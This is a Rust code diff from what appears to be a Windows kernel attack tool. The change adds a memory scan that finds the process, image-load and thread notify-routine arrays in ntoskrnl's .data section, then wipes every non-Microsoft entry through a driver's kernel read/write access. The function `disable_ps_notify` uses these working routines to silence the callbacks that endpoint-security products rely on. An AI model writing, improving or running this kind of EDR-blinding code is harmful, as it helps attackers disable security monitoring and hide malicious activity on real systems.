@@ -277,28 +277,99 @@ fn resolve_ps_array(
     ))
 }
 
+/// Scan a window of kernel `.data` for `_EX_FAST_REF`-shaped arrays.
+///
+/// The three Ps notification arrays (`PspCreateProcessNotifyRoutine`,
+/// `PspLoadImageNotifyRoutine`, `PspCreateThreadNotifyRoutine`) are declared
+/// consecutively in ntoskrnl and land back-to-back in `.data` on Win10/11.
+/// Once we've anchored on one via setter disassembly, bulk-reading a small
+/// window past it and pattern-matching for arrays that look like
+/// `_EX_FAST_REF[PSP_MAX]` finds the other two deterministically — no
+/// disassembly, no BFS, no fragility.
+///
+/// Returns up to `count` arrays in memory order (which matches nt's
+/// declaration order). One 16 KB kernel read total; all validation runs on
+/// the local copy.
+fn find_adjacent_ps_arrays(
+    drv: &Astra, cr3: u64, anchor_va: u64, count: usize,
+) -> Result<Vec<u64>, String> {
+    const WINDOW: usize = 0x4000; // 16 KB after the anchor
+    let arr_bytes = PSP_MAX * 8;
+
+    let mut buf = vec![0u8; WINDOW];
+    vread(drv, cr3, anchor_va, &mut buf)?;
+
+    let looks_like_array = |slice: &[u8]| -> bool {
+        let mut kptrs = 0u32;
+        for j in 0..PSP_MAX {
+            let off = j * 8;
+            let raw = u64::from_le_bytes(slice[off..off+8].try_into().unwrap());
+            if raw == 0 { continue; }
+            let block = raw & !0xFu64;
+            if !is_kptr(block) { return false; }   // any bogus nonzero → not an array
+            kptrs += 1;
+        }
+        kptrs > 0
+    };
+
+    // Skip past the anchor array itself and step by 8 bytes; entries are
+    // 8-byte aligned so we won't miss anything.
+    let mut found: Vec<u64> = Vec::new();
+    let mut i = arr_bytes;
+    while i + arr_bytes <= WINDOW && found.len() < count {
+        if looks_like_array(&buf[i..i+arr_bytes]) {
+            found.push(anchor_va + i as u64);
+            i += arr_bytes;                        // don't rescan the same region
+        } else {
+            i += 8;
+        }
+    }
+    Ok(found)
+}
+
 pub fn disable_ps_notify(
     drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
 ) -> Result<usize, String> {
     let (nt_disk, nt_disk_size) = load_image("ntoskrnl.exe")?;
     let mut total = 0usize;
-    // Try Ex first when it exists — on 24H2 the non-Ex thread/image setters
-    // are 5-byte tail-JMPs into the Ex form, so hitting Ex directly halves
-    // the disassembly depth we need to follow.
-    let groups: &[(&[&str], &str)] = &[
-        (&["PsSetCreateProcessNotifyRoutineEx",
-           "PsSetCreateProcessNotifyRoutine"],  "PspProc"),
-        (&["PsSetCreateThreadNotifyRoutineEx",
-           "PsSetCreateThreadNotifyRoutine"],   "PspThrd"),
-        (&["PsSetLoadImageNotifyRoutineEx",
-           "PsSetLoadImageNotifyRoutine"],      "PspImg "),
-    ];
-    for (setters, label) in groups {
-        let (used, arr) = resolve_ps_array(
-            drv, cr3, nt_disk, nt_disk_size, nt_kbase, setters,
-        ).map_err(|e| format!("{}: {e}", setters[0]))?;
-        println!("[+] {} → array VA 0x{:X}  (via {})", label.trim(), arr, used);
-        total += wipe_ps_array(drv, cr3, arr, mods, label)?;
+
+    // Anchor: PspCreateProcessNotifyRoutine.
+    //
+    // `PsSetCreateProcessNotifyRoutineEx` on modern nt keeps the array `lea`
+    // inside its own top-level body, so setter disassembly reliably lands it.
+    // The Thread and Image setters are tail-JMP wrappers whose real body
+    // sits behind 2-3 layered `Psp*` internals; instead of chasing them with
+    // fragile follow-heuristics we anchor on the Process array and locate
+    // the other two by memory adjacency (they live back-to-back in `.data`).
+    let (used, proc_arr) = resolve_ps_array(
+        drv, cr3, nt_disk, nt_disk_size, nt_kbase,
+        &["PsSetCreateProcessNotifyRoutineEx", "PsSetCreateProcessNotifyRoutine"],
+    ).map_err(|e| format!("PspProc: {e}"))?;
+    println!("[+] PspProc → array VA 0x{:X}  (via {})", proc_arr, used);
+    total += wipe_ps_array(drv, cr3, proc_arr, mods, "PspProc")?;
+
+    // The declaration order on Win10/11 24H2 is
+    //   PspCreateProcessNotifyRoutine, PspLoadImageNotifyRoutine, PspCreateThreadNotifyRoutine
+    // so we label them accordingly. Labels are cosmetic — the wipe operation
+    // is identical for all three arrays. If a future build reorders them we
+    // still null every non-MS entry in each; only the label text becomes
+    // misleading.
+    let adj_labels = ["PspImg ", "PspThrd"];
+    let adj = find_adjacent_ps_arrays(drv, cr3, proc_arr, 2)?;
+    if adj.len() < 2 {
+        eprintln!(
+            "[!] found {}/2 adjacent Ps arrays via memory scan — some notify surfaces \
+             will not be cleared. Continuing.",
+            adj.len(),
+        );
+    }
+    for (idx, va) in adj.iter().enumerate() {
+        let label = adj_labels[idx];
+        println!(
+            "[+] {} → array VA 0x{:X}  (adjacent scan +0x{:X} from PspProc)",
+            label.trim(), va, va - proc_arr,
+        );
+        total += wipe_ps_array(drv, cr3, *va, mods, label)?;
     }
     Ok(total)
 }
